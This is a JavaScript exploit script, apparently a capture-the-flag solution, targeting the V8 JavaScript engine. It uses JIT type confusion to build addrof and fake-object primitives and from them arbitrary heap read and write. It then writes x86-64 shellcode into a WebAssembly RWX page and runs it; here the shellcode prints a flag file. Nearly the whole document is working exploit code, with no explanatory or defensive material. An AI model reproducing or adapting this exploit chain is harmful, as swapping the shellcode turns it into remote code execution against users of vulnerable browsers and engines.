var buf = new ArrayBuffer(8) // 8 byte array buffer
var f64_buf = new Float64Array(buf)
var u64_buf = new Uint32Array(buf)

function hex(val){
    return "0x"+val.toString(16)
}

function ftoi(val) {
    f64_buf[0] = val
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n)
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn)
    u64_buf[1] = Number(val >> 32n)
    return f64_buf[0]
}

var a = [{}, 1.1];
var b = [1.1, 2.2];

let read_access = (obj, idx) => {
	for (let i = 0 ; i < 1 ; i++)	i++;
	return obj[idx];
}

let write_access = (obj, idx, data) => {
	for (let i = 0 ; i < 1 ; i++)	i++;
	obj[idx] = data;
	return;
}


for (i = 0n ; i < 0x100000n ; i++) {
	read_access(b, 0);
	write_access(b, 1, 13.37);
}

function addrof(obj) {
	a[0] = obj;
	return ftoi(read_access(a, 0)) & 0xffffffffn;
}

function fake_obj(addr) {
	write_access(a, 0, itof(addr))
	return a[0];
}

prp_array = {"A": 41.41, "B": 42.42, "C": 43.43, "D": 44.44, "E":45.45, "F":46.46};
var obj_array = [prp_array, prp_array, prp_array];

let heap_read_opt = (idx) => {
	return obj_array[idx].D;
}

for (i = 0n ; i < 0x100000n ; i++) {
	heap_read_opt(0);
}

function heap_read(addr) {
	if (addr % 2n == 0n)		addr = addr + 1n;
    obj_array[0] = [itof(addr - 4n)];
    return ftoi(heap_read_opt(0));
}

let float_map = heap_read(addrof(b)) & 0xffffffffn;
print("Float map pointer: " + hex(float_map));

c = [itof(float_map), 1337];

function heap_write(addr, val) {
	if (addr % 2n == 0n)		addr = addr + 1n;
	c[1] = itof((8n << 32n) + addr - 8n);
	fake_obj(addrof(c) + 0x70n + 8n)[0] = itof(val); 
	return;
}

d = new ArrayBuffer(0x80);

print("Addr of d: " + hex(addrof(d)));
print("Heap leak --> *" + hex(addrof(d)) + " - 5n + 0x18n: " + hex(heap_read(addrof(d) - 5n + 0x18n)))

littleEndian = true;
bigEndian = false;
function arb_write(addr, data, littleEndian) {
	let dataview = new DataView(d);
	heap_write(addrof(d) - 5n + 0x18n, addr);
	dataview.setBigUint64(0, data, littleEndian);	
}

shellcode = [0x9090909090909090n, 0x4831D25248BB2F62n, 0x696E2F6361745354n, 0x5F5248BB666C6167n, 0x2E74787453545E52n, 0x5657545E4831C0B0n, 0x3B0F059090909090n];
/*
0:  48 31 d2                xor    rdx,rdx
3:  52                      push   rdx
4:  48 bb 2f 62 69 6e 2f    movabs rbx,0x7461632f6e69622f		;"/bin/cat"
b:  63 61 74
e:  53                      push   rbx
f:  54                      push   rsp
10: 5f                      pop    rdi
11: 52                      push   rdx
12: 48 bb 66 6c 61 67 2e    movabs rbx,0x7478742e67616c66		;"flag.txt"
19: 74 78 74
1c: 53                      push   rbx
1d: 54                      push   rsp
1e: 5e                      pop    rsi
1f: 52                      push   rdx
20: 56                      push   rsi
21: 57                      push   rdi
22: 54                      push   rsp
23: 5e                      pop    rsi
24: 48 31 c0                xor    rax,rax
27: b0 3b                   mov    al,0x3b
29: 0f 05                   syscall								;execve("/bin/cat", ["/bin/cat", "flag.txt", NULL], NULL)
*/

//https://wasdk.github.io/WasmFiddle
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);

shellcode_addr = heap_read(addrof(wasmInstance) - 0x8212069n + 0x82120d0n);
print("RWX addrss: " + hex(shellcode_addr));

let shcode_writer = new DataView(d);
heap_write(addrof(d) - 5n + 0x18n, shellcode_addr);

for (let i = 0n ; i < shellcode.length ; i++) {
	arb_write(shellcode_addr + i*8n, BigInt(shellcode[i]), bigEndian);
}

wasmInstance.exports.main();

//END